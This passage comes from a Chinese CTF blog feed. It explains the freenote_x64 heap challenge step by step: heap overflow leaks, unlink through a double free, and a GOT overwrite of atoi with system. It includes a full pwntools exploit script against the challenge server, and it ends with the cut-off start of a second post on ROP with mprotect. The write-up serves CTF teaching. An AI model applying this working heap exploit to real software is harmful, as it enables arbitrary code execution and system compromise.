alt=""></li><li>在看一下delet的时候，首先free后没有置NULL，其次free之前，没有检查这一note的有效位，这里可以做double_free <img src="https://s1.ax1x.com/2020/05/09/YQTvwD.png" alt=""></li></ul><h2 id="0x02-利用思路"><a href="#0x02-利用思路" class="headerlink" title="0x02 利用思路"></a>0x02 利用思路</h2><h3 id="0x02-1-leak-heap-base"><a href="#0x02-1-leak-heap-base" class="headerlink" title="0x02_1 leak heap_base"></a>0x02_1 leak heap_base</h3><ul><li>我们已知了题目存在的漏洞，那么现在来整理一下利用的思路。首先我们通过申请5个的chunk（0、1、2、3、4、5），然后delet其中的两个<strong>不相邻</strong>的chunk（3、1）防止被top chunk合并。此时他们会放在unsortbins中（根据他们的大小）。然后堆溢出（通过edit编辑0号note），覆盖下一chunk（即chunk 1）的head，此时可以打印出下一chunk的fb，bk指针了。然后我们开始泄漏堆基址（通过泄露出的chunk1的fb指针，此时指向chunk 3），将拿到的chunk3的地址减去他之前的3个chunk再减去索引表，就是heap_base了。</li></ul><h3 id="0x02-2-leak-libc-base"><a href="#0x02-2-leak-libc-base" class="headerlink" title="0x02_2 leak libc base"></a>0x02_2 leak libc base</h3><ul><li><p>好了此时我们拿到了heap_base，下一步拿libc_base，我们通过edit再次打出堆溢出，不过此时我们要的是bk指针，因为此时的bk指针指向的是 <code>main_arena_88</code>,<strong>因为unsortbin是一个双向循环链表，这个&lt;main_arena+88&gt;，实际上是unsortedbins的表头位置</strong>，然后我们给出拿到libc_base的方法：<code>libc_base = main_arena_88 - 88 - 0x20  - libc.sym[&#39;__malloc_hook&#39;] #(这里是个偏移，可能是0x10或者0x20这种，要自己调试一下)</code> </p></li><li><p>结合我们的调试信息就很好理解了,其实就是先求出<strong>malloc_hook得到实际地址然后减掉libc里的地址，这里很好理解，只不过求</strong>malloc_hook实际地址的时候最好结合我们以下的调试信息<br><img src="https://s1.ax1x.com/2020/05/11/YGNva8.png" alt=""></p></li></ul><h3 id="0x02-3-Double-free配合Unlink"><a href="#0x02-3-Double-free配合Unlink" class="headerlink" title="0x02_3 Double_free配合Unlink"></a>0x02_3 Double_free配合Unlink</h3><ul><li>ok现在我们有了libc_base与heap_base，就可以干很多事情了。<strong>接下来是最重要的触发unlink</strong></li><li>在现在版本的glibc中，Unlink已经加入了一些安全性的检查（其实我觉得应该叫“循环双链表完整性检查”），在触发unlink之前我们需要做一些准备——首先，我们需要<strong>修改chunk0来伪造出一个已经处于free状态的fake_chunk，这样当我们再次free chunk1的时候此时就会触发前向合并以及unlink</strong>：<img src="https://s1.ax1x.com/2020/05/11/YGrONq.png" alt=""></li><li>而他这个unlink究竟做了什么事情呢？其实就是一个双链表中结点脱链的问题.</li></ul><p><em>unlink是利用glibc malloc 的内存回收机制造成攻击的，核心就在于当两个free的堆块在物理上相邻时，会将他们合并，并将原来free的堆块在原来的链表中解链，加入新的链表中，但这样的合并是有条件的，向前或向后合并。但这里的前和后都是指在物理内存中的位置，而不是fd和bk链表所指向的堆块。<br>以当前的chunk为基准，将preivous free chunk合并到当前chunk称为向后合并，将后面的free chunk合并到当前chunk就称为向前合并。</em><img src="https://s1.ax1x.com/2020/05/11/YG6p79.png" alt="">此时的P结点相当于题目中的chunk 0结点，可以看到，如果我们能进行unlink完成，那么就可以造成前向合并 + P（chunk 0）的脱链。以下是unlink的检查代码，我们需要绕过它:<br>    <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);               \</span><br><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line"><span class="comment">// next_size related</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">            malloc_printerr (check_action,                                      \</span><br><span class="line">                            <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                            P, AV);</span><br></pre></td></tr></table></figure></p><ul><li>所以在我们伪造chunk的时候需要做两件事：<strong>1.作出的fake_chunk的size位与下一chunk的pre_size位达到统一，突破大小检查机制。2.需满足(P-&gt;fd = &amp;P-0x18) &amp;&amp; (P-&gt;bk = &amp;P - 0x10)以突破循环双链表的完整性检查，原因请看下图：</strong><img src="https://s1.ax1x.com/2020/05/13/YdETw4.png" alt=""></li><li>很多人又要问了，那这个Unlink的攻击点到底在哪里，我们突破了Unlink的检查，让Unlink正常完成，然后呢？？unlink结束后到底发生了什么？我们先来看一下前向合并的代码,可以发现，合并后他并没有修改P指针，而只是修改了size<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*这里p指向当前chunk*/</span></span><br><span class="line">nextchunk = chunk_at_offset(p, <span class="built_in">size</span>);</span><br><span class="line">……</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; </span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<span class="comment">//判断nextchunk是否为free chunk</span></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//next chunk为free chunk</span></span><br><span class="line">            unlink(nextchunk, bck, fwd); <span class="comment">//将nextchunk从链表中移除</span></span><br><span class="line">          <span class="built_in">size</span> += nextsize; <span class="comment">// p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！</span></span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);    </span><br><span class="line"> </span><br><span class="line">      ……</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><strong>由于我们是双链表脱链，所以P前后两个chunk的指针都要修改，这里很重要！！是unlink攻击的本质</strong>，主要就是这俩步：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK;    <span class="comment">// P后面结点的前向指针指向P前面的结点，这是第一步</span></span><br><span class="line">BK-&gt;fd = FD;    <span class="comment">// P前面结点的后向指针指向P后面的结点，这是第二步</span></span><br></pre></td></tr></table></figure></li><li>我们知道了这两步后看看发生了什么，<strong>首先，第一步：</strong><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FD -&gt; bk = BK;</span><br><span class="line"><span class="comment">/*等价于*/</span></span><br><span class="line">P-&gt;fd-&gt;bk = P-&gt;bk;</span><br><span class="line"><span class="comment">/*等价于*/</span></span><br><span class="line">*(P-&gt;fd+<span class="number">0x18</span>) = P-&gt;bk;      <span class="comment">/*这是（1）式，我们等下要用来代换*/</span></span><br><span class="line"><span class="comment">/*又因为，我们构造了*/</span></span><br><span class="line">P-&gt;bk = &amp;P - <span class="number">0x10</span>;          <span class="comment">/*这是（2）式，我们将它带入（1）式*/</span></span><br><span class="line">P-&gt;fd = &amp;P - <span class="number">0x18</span>           <span class="comment">/*这是（3）式，我们将它带入（1）式*/</span></span><br><span class="line"><span class="comment">/*最终得到（4）式*/</span></span><br><span class="line">*( (&amp;P<span class="number">-0x18</span>) + <span class="number">0x18</span>) = &amp;P - <span class="number">0x10</span>;</span><br><span class="line"><span class="comment">/*最终得到这个式子*/</span></span><br><span class="line">P = &amp;P - <span class="number">0x10</span>;                          <span class="comment">/*这就是第一步完成后P指向的位置*/</span></span><br></pre></td></tr></table></figure></li><li>下来我们直接给出第二步完成后P指向的位置，过程和第一步完全一样，大家可以自己写一下练习一下，而这一步结束后，我们得到的就是<strong>在unlink结束后P指向的最终位置</strong><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P = &amp;P - <span class="number">0x18</span>;  <span class="comment">/*注意，这里本质是 0x08 * 3,这是在64位下的，如果在32位下就是 0x04 * 3 = 0x0c */</span></span><br></pre></td></tr></table></figure></li><li><strong>综上，断链后P指向（&amp;P-0x18）内存的位置，也就是说通过unlink这个操作，我们可以改写指向 chunk0 的指针 P（即索引表中原本指向note0的指针）指向 &amp;P - 3（64位下就是&amp;P - 0x18） 的地址（其实就是已经指回了索引表），然后我们利用 edit()对note0进行修改时，实际上就是对索引表进行任意修改，即可实现任意地址写，跳转。</strong></li></ul><h3 id="0x02-4-Got表劫持"><a href="#0x02-4-Got表劫持" class="headerlink" title="0x02_4 Got表劫持"></a>0x02_4 Got表劫持</h3><ul><li>此时，我们就可以通过 <code>edit()</code>函数修改索引表中储存的note的地址即P，让他指向我们想要的地方<img src="https://s1.ax1x.com/2020/05/13/YdBDjP.png" alt=""></li><li>然后在下一次调用<code>edit()</code>时，我们就可以覆写Got中atoi函数的地址为<code>system()</code>函数的地址，那么当我们调用<code>atoi()</code>时，就相当于调用了<code>system()</code>，然后再读入<code>bin/sh\x00</code>，就可以打出去了。</li><li>我们此时<code>edit(1,p64(libc.sym[&#39;system&#39;]+libc_base))   # 劫持Got表，在atoi的地方覆写为system地址</code>，<strong>注意，此时索引表中本应指向note1的指针已被修改为指向got中atoi的位置</strong></li><li>最后一步，我们在choice后发送/bin/sh即可，<code>io.sendlineafter(&#39;choice: &#39;,&#39;/bin/sh\x00&#39;)</code>，可能有同学会问，我们为什么在choice的时候发送/bin/sh就好了，<strong>因为我们上一步劫持的atoi函数不是随便选的，这又要回到这个程序的结构</strong><img src="https://s1.ax1x.com/2020/05/13/Yd6z7V.png" alt="">)这个函数的作用是读入你输入的choice，也就是选项，我们进去看一下。<img src="https://s1.ax1x.com/2020/05/13/Ydcl1H.png" alt="">)最终到达了<code>input()</code>我们看到，在他的最后，他用atoi处理了我们输入的值！（在这个函数里叫&amp;nptr指向我们输入的选项），<strong>atoi负责将这个输入（字符串类型），转成整形</strong>。已知此时调用atoi已经变成调用system了！我们还差一个system的参数/bin/sh,那只要将&amp;nptr指向为”/bin/sh\x00”不就构造出来了吗？这就是我们最后一步的原因。<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-知识点与攻击流程总结"><a href="#0x03-知识点与攻击流程总结" class="headerlink" title="0x03 知识点与攻击流程总结"></a>0x03 知识点与攻击流程总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1.申请5个chunk(chunk_0到chunk_5)，free掉不相邻的两个(chunk_3与chunk_1)，防止被topchunk合并。</span><br><span class="line"></span><br><span class="line">2.edit()函数编辑chunk_0第一次打出堆溢出，覆盖chunk_1的head，然后调用list_()就可以print出下一个chunk_1的fd指针了。</span><br><span class="line"></span><br><span class="line">3.接收list_()的返回，拿到chunk_3地址（fd指针指向的），减去偏移得到chunk_base</span><br><span class="line"></span><br><span class="line">4.edit()函数编辑chunk_0第二次打出堆溢出，覆盖chunk_1的head，就可以print出下一个chunk_1的bk指针了。</span><br><span class="line"></span><br><span class="line">5.接收list_()的返回，拿到 &lt;main_arena+88&gt; 地址（bk指针指向的），减去偏移(libc_base &#x3D; main_arena_88 - libc.sym[&#39;__malloc_hook&#39;] - 88 - 0x20 # 0x10 ? 0x20 ?)得到libc_base。</span><br><span class="line"></span><br><span class="line">6.edit()函数编辑chunk_0，使用chunk_0构造fake_chunk，然后第二次free() chunk_1触发double free以及Unlink以及前向合并。</span><br><span class="line"></span><br><span class="line">7.edit()修改索引表中chunk_1的地址为Got表中atoi的地址。</span><br><span class="line"></span><br><span class="line">8.edit()修改Got中atoi那一项储存的atoi的真实地址为system的地址。</span><br><span class="line"></span><br><span class="line">9.最后在接收choice后发送&#x2F;bin&#x2F;sh\x00</span><br><span class="line"></span><br><span class="line">10.pwn</span><br></pre></td></tr></table></figure><h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=UTF-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line">elf = ELF(<span class="string">"./freenote_x64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'0'</span>:</span><br><span class="line">    io = process([<span class="string">'./freenote_x64'</span>],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"libc-2.19.so"</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9886</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'new note: '</span>,str(len(payload)))</span><br><span class="line">    io.sendafter(<span class="string">'note: '</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'number: '</span>,str(num))</span><br><span class="line">    io.sendlineafter(<span class="string">'note: '</span>,str(len(payload)))</span><br><span class="line">    io.sendafter(<span class="string">'your note: '</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'number: '</span>,str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="string">'a'</span> * <span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(io)[0])</span></span><br><span class="line">new(<span class="string">'b'</span> * <span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'c'</span> * <span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'d'</span> * <span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">'e'</span> * <span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(io)[0])</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'b'</span>*<span class="number">0x80</span>+<span class="string">'e'</span>*<span class="number">0x10</span>)           <span class="comment"># 此时造成堆溢出，覆盖下一个chunk的head，然后就可以print出下一个chunk的fk，bk指针了</span></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(io)[0])</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">list_()</span><br><span class="line">io.recvuntil(<span class="string">'e'</span>*<span class="number">0x10</span>)              <span class="comment"># 收到覆盖的head的位置，接下来开始拿地址</span></span><br><span class="line">log.progress(<span class="string">"leak heap address: "</span>)</span><br><span class="line">temp = u64(io.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))  <span class="comment"># 接收到换行停止，同时左对齐，此时是chunk3的地址</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"temp:"</span>,hex(temp)</span><br><span class="line">heap_base = temp - <span class="number">0x1820</span> - <span class="number">0x90</span>*<span class="number">3</span>  <span class="comment"># 减去前面几个块以及topchunk，到达堆基址</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_base: "</span>,hex(heap_base)</span><br><span class="line">success(<span class="string">"leak heap address OK"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.progress(<span class="string">"leak libc address: "</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'b'</span>*<span class="number">0x80</span>+<span class="string">'e'</span>*<span class="number">0x18</span>)</span><br><span class="line">list_()</span><br><span class="line">io.recvuntil(<span class="string">'e'</span>*<span class="number">0x18</span>)</span><br><span class="line">main_arena_88 = u64(io.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"main_arena_88: "</span>,hex(main_arena_88)</span><br><span class="line">libc_base = main_arena_88 - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">88</span> - <span class="number">0x20</span> <span class="comment"># 0x10 ? 0x20 ?</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base: "</span>,hex(libc_base)</span><br><span class="line">success(<span class="string">"leak libc address OK"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""这里开始unlink，首先我们要"""</span></span><br><span class="line">log.progress(<span class="string">"start unlink: "</span>)</span><br><span class="line">payload = flat(</span><br><span class="line">            p64(<span class="number">0</span>),                             <span class="comment"># 先填充四字的0</span></span><br><span class="line">            p64(<span class="number">0x80</span>),                          <span class="comment"># 伪造chunk 0</span></span><br><span class="line">            p64(heap_base + <span class="number">0x30</span> - <span class="number">0x18</span>),       <span class="comment"># 为了通过检查，伪造fd</span></span><br><span class="line">            p64(heap_base + <span class="number">0x30</span> - <span class="number">0x10</span>),       <span class="comment"># 为了通过检查，伪造bk</span></span><br><span class="line">            cyclic(<span class="number">0x80</span><span class="number">-0x20</span>),                  <span class="comment"># 新的填充量</span></span><br><span class="line">            p64(<span class="number">0x80</span>),                          <span class="comment"># 伪造pre_size</span></span><br><span class="line">            p64(<span class="number">0x90</span>)                           <span class="comment"># 伪造 size</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'p'</span>)             <span class="comment"># unlink 覆盖 p 之后，edit 的时候要注意长度要跟上次一样，不然会进入判断调用 realloc 导致程序崩溃。做一个补位</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)                                      <span class="comment"># 触发unlink</span></span><br><span class="line">success(<span class="string">"unlink OK"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">            p64(<span class="number">2</span>),                             <span class="comment"># 当前存在的note数量</span></span><br><span class="line">            p64(<span class="number">1</span>),                             <span class="comment"># 有效位</span></span><br><span class="line">            p64(<span class="number">0x80</span>),                          <span class="comment"># note大小</span></span><br><span class="line">            p64(heap_base+<span class="number">0x30</span>),                <span class="comment"># note地址</span></span><br><span class="line">            p64(<span class="number">1</span>),                             <span class="comment"># 有效位</span></span><br><span class="line">            p64(<span class="number">8</span>),                             <span class="comment"># note大小</span></span><br><span class="line">            p64(elf.got[<span class="string">'atoi'</span>])                <span class="comment"># 把指针变为指向got表中atoi函数</span></span><br><span class="line">)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">'p'</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_base_0x30: "</span>,hex(heap_base+<span class="number">0x30</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"got['atoi']: "</span>, hex(elf.got[<span class="string">'atoi'</span>])     <span class="comment"># 修改指向note1的指针为指向got表中atoi</span></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(io)[0])</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">'system'</span>]+libc_base))   <span class="comment">#   写入system地址</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc.sym['system']+libc_base : "</span>, hex(libc.sym[<span class="string">'system'</span>]+libc_base)</span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(io)[0])</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'/bin/sh\x00'</span>)  <span class="comment"># 发送system函数的参数</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x05-后记"><a href="#0x05-后记" class="headerlink" title="0x05 后记"></a>0x05 后记</h2><p>这几天一直在想怎么才能把这个综合题以及unlink的过程讲清楚，我觉得我这篇文章可以说是网上把unlink讲的最细的之一了。其一是为了自己再熟悉熟悉，其二希望能对后来学习堆的CTFer做一点指引，不至于第一次接触unlink就完全懵逼，希望能多多少少能给其他人带来一些帮助。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF &amp;&amp; heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从一道经典的x64pwn学习mprotect与GOT表覆写</title>
    <link href="/2020/04/30/%E4%BB%8E%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84x64pwn%E5%AD%A6%E4%B9%A0mprotect%E4%B8%8EGOT%E8%A1%A8%E8%A6%86%E5%86%99/"/>
    <url>/2020/04/30/%E4%BB%8E%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84x64pwn%E5%AD%A6%E4%B9%A0mprotect%E4%B8%8EGOT%E8%A1%A8%E8%A6%86%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h2 id="写在前面（考察知识点）"><a href="#写在前面（考察知识点）" class="headerlink" title="写在前面（考察知识点）"></a>写在前面（考察知识点）</h2><ul><li>x64通用ROPgadget构造传参</li><li>libc_base地址计算</li><li>mprotect函数基本用法（.bss段权限调整）</li><li>GOT表覆写</li><li>shellcode注入.bss段</li></ul><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><ul><li>给出了一个64为可执行程序和一个相应的libc</li><li>system、exec函数族函数被禁用（实际没有，但是题目要求我们按照禁用的做，不可使用system和exec族函数）</li><li>没有可使用的现成的shellcode（需要自己注入进去shellcode）</li><li>bss段<strong>没有可执行权限</strong>，要用mprotect去改</li></ul><h2 id="开始pwn"><a href="#开始pwn" class="headerlink" title="开始pwn"></a>开始pwn</h2><p><strong>1.主体程序分析：</strong><br><img src="https://s1.ax1x.com/2020/04/30/Jqsuc9.png" alt="a"><br>一个典型的栈溢出：分配了0x80，读进去200，不过这道题难点不在这里，难点在于，禁用system，exec函数族，没有shellcode。。（啥都没有）我们要想方设法重复利用这个栈溢出去达到我们的目的。<br><img src="https://s1.ax1x.com/2020/04/30/JqshBq.png" alt="b"><br>看一些GOT表里面的函数，我们覆写的时候要选择能用的。<br><strong>2.整体思路过程</strong></p><ul><li><p>首先我们这道题要重复使用x64下的基于__libc_csu_init(),这个函数实际上是程序的一个构造函数（当然有构造函数也有对应的析构函数）详情看(虽然是x86的，但也可以借鉴)<a href="https://luomuxiaoxiao.com/?p=516" target="_blank" rel="noopener">Linux X86 程序启动 – main函数是如何被执行的？</a><br>这是万能ROPgadget本体：<br><img src="https://s1.ax1x.com/2020/04/30/JqWbon.png" alt=""><br>我们将它分为三部分看：<br>（1）<strong>0x4006aa到0x4006b4</strong><br> 在这一部分，我们将栈中的值pop到rbx、rbp、r12、r13、r14、r15，也就是说，如果我们提前在栈上布置好，就可以把值送入这些寄存器，已被后续使用。</p><p>  （2）<strong>0x400690到0x400699</strong><br>  在这一部分，我们将r13，r14，r15d分别送入rdx，rdi，edi（rdi的低位），而在x64传参数的时候，前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。这是与x86很不一样的一点。<a href="https://www.ituring.com.cn/article/216561" target="_blank" rel="noopener">记一次linux x64 的栈溢出</a>，也就是说，在这一部分，我们可以完成前三个参数的传递，这样我们进入函数的基础就有了，接下来<code>0x0000000000400699 &lt;+73&gt;:    call   QWORD PTR [r12+rbx*8]</code>这里会帮助我们跳转到我们要执行的函数，这样就完成了一次劫持，不过要注意的是：r12并不是我们目标函数的地址，准确的来说，我们要将目标函数（或shellcode）覆写GOT表中（替换一个got表中已有的函数），然后通过跳转进入相应的GOT表中的表项来达到执行目标函数的目的！（这里一开始踩坑了。。）</p><p>  （3）<strong>0x40069d到0x4006a4</strong><br>   